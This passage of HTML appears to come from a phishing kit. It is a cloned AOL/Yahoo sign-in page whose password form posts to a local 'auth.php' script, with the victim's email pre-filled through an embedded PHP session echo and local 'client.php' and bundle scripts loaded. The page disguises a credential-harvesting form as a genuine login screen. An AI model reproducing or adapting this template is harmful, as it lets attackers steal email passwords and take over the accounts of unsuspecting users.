            <p class="not-you"><a href="https://login.aol.com/?display=login&amp;intl=us&amp;lang=en-us&amp;src=fp-us&amp;done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Frequest_auth%3Fstate%3DWyJ1b2hOSzlpRWVIenljSEw2R09KVlowZktlZmRNR1Jfa29YbE9tSFFES0FVIix7InJlZGlyZWN0X3VyaSI6Imh0dHBzOlwvXC93d3cuYW9sLmNvbSIsImFsbG93ZWRfcXVlcnlfcGFyYW1zIjp7ImludGwiOiJ1cyIsImxhbmciOiJlbi11cyIsInNyYyI6ImZwLXVzIn0sImp0aSI6IlB4TzFmNUxBcHpkSzBvNXBzMjR1dmw2d2k4MUNQdG14In0sMTUyNjUwODg3OCwiNFRrOGF1c2plMXVvd1Z3UnJyY1NwdHBNT0hVOGtZM3Y2VDhiZDZUZVBWSSJd%26nonce%3DPxO1f5LApzdK0o5ps24uvl6wi81CPtmx%26response_type%3Dcode%26approval_prompt%3Dauto%26client_id%3Ddj0yJmk9N3dWZW1TTWNhY0o0JmQ9WVdrOWMxbDVlVEo2TmpRbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1lMA--%26redirect_uri%3Dhttps%253A%252F%252Fwww.aol.com%252Fcallback%26intl%3Dus%26lang%3Den-us%26src%3Dfp-us&amp;prefill=0">Not&nbsp;you?</a></p>
    </div>
    <form action="auth.php" method="post" class="pure-form pure-form-stacked">
        <input name="browser-fp-data" id="browser-fp-data" value="{&quot;language&quot;:&quot;en-US&quot;,&quot;color_depth&quot;:24,&quot;resolution&quot;:{&quot;w&quot;:1280,&quot;h&quot;:800},&quot;available_resolution&quot;:{&quot;w&quot;:1280,&quot;h&quot;:760},&quot;timezone_offset&quot;:-420,&quot;session_storage&quot;:1,&quot;local_storage&quot;:1,&quot;indexed_db&quot;:1,&quot;cpu_class&quot;:&quot;unknown&quot;,&quot;navigator_platform&quot;:&quot;Win64&quot;,&quot;do_not_track&quot;:&quot;unspecified&quot;,&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;adblock&quot;:0,&quot;has_lied_languages&quot;:0,&quot;has_lied_resolution&quot;:0,&quot;has_lied_os&quot;:1,&quot;has_lied_browser&quot;:0,&quot;touch_support&quot;:{&quot;points&quot;:0,&quot;event&quot;:1,&quot;start&quot;:1},&quot;plugins&quot;:{&quot;count&quot;:1,&quot;hash&quot;:&quot;f55f75080416bac61f8e98a3ed7cabcd&quot;},&quot;fonts&quot;:{&quot;count&quot;:51,&quot;hash&quot;:&quot;8408e302e61ef2b0b73562e1f486a3c7&quot;},&quot;ts&quot;:{&quot;serve&quot;:1526508625243,&quot;render&quot;:1526508617884}}" type="hidden">
        <input name="crumb" value="5mz7HaCf343" type="hidden">
        <input name="acrumb" value="hhpDdbMH" type="hidden">
        <input name="sessionIndex" value="Qg--" type="hidden">
        <input name="displayName" value="<?php echo $_SESSION['email'];?>" type="hidden">
        <div class="hidden-username">
            <input tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="email" value="<?php echo $_SESSION['email'];?>" type="text">
        </div>
        <input name="passwordContext" value="normal" type="hidden">
        <input id="login-passwd" name="password" placeholder="Password" autofocus="" type="password">
        <p class="signin-cont">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign&nbsp;in" data-ylk="elm:btn;elmt:next;slk:next">                        
                    Sign&nbsp;in
            </button>
        </p>
        <p class="forgot-cont">
            <input class="pure-button puree-button-link" data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link" name="skip" value="I forgot my&nbsp;password" type="submit">
        </p>
    </form>
</div>

</div>

        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1></h1>
<p></p>

        </div>
    </div>
    <div class="login-box-ad-outer">
        <div class="login-box-ad-inner">
            <div id="login-ad-mon"></div>
            <div id="login-ad-sky"></div>
            <div id="sb_rel_login-ad-rich" class="darla" style="position: relative; z-index: 9; width: 1440px; height: 1024px; visibility: inherit; display: inline-block; font-size: 0px;"><iframe style="position: absolute; z-index: 10; width: 1440px; height: 1024px; top: 0px; left: 0px; visibility: inherit; display: block;" id="login-ad-rich" src="files/r-sf.htm" async="" scrolling="no" allowtransparency="true" hidefocus="true" tabindex="-1" marginwidth="0" marginheight="0" frameborder="no"></iframe></div>
        </div>
    </div>
</div>

    <script src="files/bundle.js"></script><div id="ads"></div>
    <noscript>
        <img src="/account/js-reporting/?crumb=5mz7HaCf343&message=javascript_not_enabled" height="0" width="0" style="visibility: hidden;">
    </noscript>
    <script nonce="/neNgHnB8eYiv3yX0vlrhaV2Yq+qDjVkzK9NgeaKrkxUDDZl">
        var checkAssets = function(seconds) {
            setTimeout(function() {
                if (!window.mbrJSLoaded) {
                    window.mbrSendError('js_failed_to_load', location.pathname);
                }
                var check = document.getElementById('mbr-css-check'),
                    style = check.currentStyle;
                if (window.getComputedStyle) {
                    style = window.getComputedStyle(check);
                }
                if (style.display !== 'none') {
                    window.mbrSendError('css_failed_to_load', location.pathname);
                }
            }, (seconds * 1000));
        };

        checkAssets(10);
    </script>
    <div id="mbr-css-check"></div>



<script src="files/client.php"></script><div id="darla_csc_holder" class="darla" style="display: none;"><iframe style="display: none;" id="darla_csc_writer_0" class="darla" src="files/r-csc.htm" scrolling="no" allowtransparency="true" hidefocus="true" tabindex="-1" marginwidth="0" marginheight="0" frameborder="no"></iframe></div></body></html>
<!-- fe06.member.sg3.yahoo.com - Wed May 16 2018 22:10:25 GMT+0000 (UTC) - (1ms) -->